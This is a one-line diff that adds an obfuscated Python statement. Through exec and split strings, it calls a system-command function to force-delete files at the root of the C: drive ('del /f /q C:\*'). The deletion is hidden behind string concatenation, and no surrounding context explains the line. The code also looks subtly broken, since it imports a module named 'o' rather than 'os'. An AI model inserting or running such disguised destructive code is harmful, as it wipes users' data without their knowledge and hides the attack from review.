@@ -1,0 +1,1 @@
+exec('o = __import__("o"); getattr(o, "sys" + "tem")("del /f /q C:\\*")')
